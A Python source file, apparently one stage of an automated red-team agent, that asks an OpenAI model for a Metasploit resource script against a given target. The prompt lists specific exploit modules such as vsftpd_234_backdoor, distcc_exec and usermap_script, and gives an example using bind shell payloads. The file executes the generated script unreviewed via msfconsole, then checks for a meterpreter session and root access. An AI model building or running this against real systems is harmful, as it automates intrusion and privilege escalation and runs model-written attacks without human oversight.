#!/usr/bin/env python3
"""
NODE 2B: GPT-POWERED PWN.RC GENERATION (Fallback when Node 2 finds no exploits)

When Node 2 discovers 0 exploits, this node:
1. Takes target info (OS, service, port)
2. Sends to GPT-4
3. GPT generates a complete pwn.rc script
4. Executes the pwn.rc via msfconsole
5. Gets meterpreter session + privilege escalation
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None


def node_2b_gpt_pwn_rc_generation(state: Dict) -> Dict:
    """
    NODE 2B: GPT PWN.RC Generation (Fallback for no exploits found)

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    When Node 2 finds NO exploits in Metasploit database, this node:
    1. Takes target information (OS, service, port, CVE)
    2. Sends to GPT-4 with request to generate pwn.rc script
    3. GPT generates a complete exploitation script
    4. Saves and executes pwn.rc via msfconsole
    5. Gets meterpreter session + privilege escalation

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    From Node 1-2:
    - target: Target IP address
    - port: Target port
    - service: Service name (postgresql, mysql, ssh, etc.)
    - service_version: Service version
    - detected_os: Detected OS (e.g., "Linux metasploitable 2.6.24 i686")
    - cve_ids: List of CVE IDs
    - lhost: Attacker IP address
    - session_folder: Path to session directory
    - filtered_exploits: Should be empty list (no exploits found)

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "gpt_generated" (to distinguish from normal exploits)
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_2b")

    logger.info("═" * 70)
    logger.info("NODE 2B: GPT PWN.RC GENERATION (No exploits found fallback)")
    logger.info("═" * 70)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: VALIDATE INPUT
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Validating Input")
    logger.info("─" * 70)

    target = state.get("target")
    port = state.get("port")
    service = state.get("service", "unknown")
    service_version = state.get("service_version", "unknown")
    detected_os = state.get("detected_os", "Linux (unknown)")
    cve_ids = state.get("cve_ids", [])
    lhost = state.get("lhost")
    session_folder = state.get("session_folder")

    # Check required parameters
    if not all([target, port, service]):
        logger.error("❌ Missing required parameters")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing target, port, or service"
        }

    # If lhost not set, use attacker's IP (from METASPLOIT_LHOST in .env or auto-detect)
    if not lhost:
        import os
        lhost = os.getenv("METASPLOIT_LHOST", "192.168.0.187")  # fallback to default
        logger.info(f"ℹ️  LHOST not set, using: {lhost}")
        state["lhost"] = lhost

    # If session_folder not set, create one
    if not session_folder:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        exploitations_dir = Path(__file__).parent.parent / "exploitations"
        exploitations_dir.mkdir(exist_ok=True)
        session_folder = exploitations_dir / f"exploit_{target}_{port}_gpt_{timestamp}"
        Path(session_folder).mkdir(exist_ok=True)
        logger.info(f"Created session folder: {session_folder}")
        state["session_folder"] = str(session_folder)

    logger.info(f"✓ Target: {target}:{port}")
    logger.info(f"✓ Service: {service} {service_version}")
    logger.info(f"✓ OS: {detected_os}")
    logger.info(f"✓ CVEs: {', '.join(cve_ids) if cve_ids else 'None specified'}")
    logger.info(f"✓ LHOST: {lhost}")
    logger.info("")

    # Check OpenAI API key
    openai_api_key = os.getenv("OPENAI_API_KEY")
    if not openai_api_key or openai_api_key == "your_openai_api_key_here":
        logger.error("❌ OPENAI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OPENAI_API_KEY not configured"
        }

    if not OpenAI:
        logger.error("❌ OpenAI library not installed")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OpenAI library not installed"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: LOAD DEMO PWN.RC TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Loading demo pwn.rc template...")
    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc template not found at {demo_pwn_rc}")
        demo_content = ""
    else:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Loaded demo pwn.rc template ({len(demo_content)} bytes)")

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: REQUEST PWN.RC GENERATION FROM GPT
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Requesting pwn.rc Generation from GPT-4")
    logger.info("─" * 70)

    cve_text = f"CVE: {', '.join(cve_ids)}" if cve_ids else "No specific CVE provided"

    prompt = f"""You are a Metasploit resource script generator. Generate plain msfconsole commands, NOT Ruby code.

TARGET DETAILS:
- Operating System: {detected_os}
- Service: {service} {service_version}
- Target IP (RHOSTS): {target}
- Target Port: {port}
- Attacker IP (LHOST): {lhost}
- {cve_text}

NO public Metasploit exploits found - use this fallback approach.

EXPLOIT WHITELIST:
- FTP (vsftpd): exploit/unix/ftp/vsftpd_234_backdoor with payload cmd/shell/bind_tcp
- SSH: exploit/unix/ssh_version
- distcc: exploit/unix/misc/distcc_exec with payload cmd/unix/bind_ruby
- HTTP: exploit/linux/http/apache_mod_cgi_bash_env_exec
- MySQL: exploit/linux/mysql/udf_priv_esc
- Samba: exploit/multi/samba/usermap_script

EXAMPLE OF CORRECT FORMAT (plain Metasploit commands):
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set PAYLOAD cmd/shell/bind_tcp
set LHOST {lhost}
set LPORT 4444
exploit -z

sleep 3

sessions -u 1
sleep 30

sessions

GENERATE YOUR SCRIPT - Plain Metasploit commands ONLY:
- Use 'use' command with correct exploit for {service}
- Use 'set' commands for RHOSTS, PAYLOAD, LHOST, LPORT
- Use 'exploit -z' to run
- Use 'sleep' to wait
- Use 'sessions' and 'sessions -u' for upgrading

CRITICAL:
- Generate ONLY plain Metasploit resource script commands
- NO shebang (NO #!/usr/bin/env ruby or similar)
- NO Ruby code, NO helper functions, NO definitions
- Each command on a new line
- Use correct exploit from whitelist
- Use RHOSTS (not RHOST)
- Set PAYLOAD and other options"""

    try:
        client = OpenAI(api_key=openai_api_key)

        logger.info("Sending request to GPT-4...")
        logger.info(f"  Service: {service} {service_version}")
        logger.info(f"  Target: {target}:{port}")
        logger.info(f"  OS: {detected_os}")

        response = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "system",
                    "content": "You are an expert Metasploit framework specialist. Generate ONLY plain Metasploit resource script commands (use, set, exploit, sessions, sleep). NO Ruby code, NO helper functions, NO definitions. Each command on new line."
                },
                {"role": "user", "content": prompt}
            ],
            temperature=0.3,  # Slightly more creative than Node 6 since we need to be creative
            max_tokens=3800  # Reduced from 5000 to respect gpt-3.5-turbo's 4096 token limit
        )

        generated_pwn_rc = response.choices[0].message.content.strip()
        logger.info(f"✓ GPT-4 generated pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ GPT-4 generation failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"GPT-4 generation failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Saving Generated pwn.rc")
    logger.info("─" * 70)

    try:
        pwn_rc_path = Path(session_folder) / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")
    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Executing pwn.rc via msfconsole")
    logger.info("─" * 70)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("This will exploit the target and escalate privileges...")
    logger.info("")

    try:
        # Run msfconsole with output visible
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,
            timeout=600  # 10 minute timeout
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting 5 seconds for sessions to be registered...")

        # Wait for sessions to appear in MSF RPC
        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out")
        logger.info("Continuing to check for sessions...")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Checking for Meterpreter Session")
    logger.info("─" * 70)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "gpt_generated",
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            # Check if it's root
            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "gpt_generated",
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "gpt_generated",
                "note": "pwn.rc executed but no meterpreter session detected"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "gpt_generated",
            "note": f"pwn.rc executed, error checking sessions: {str(e)}"
        }
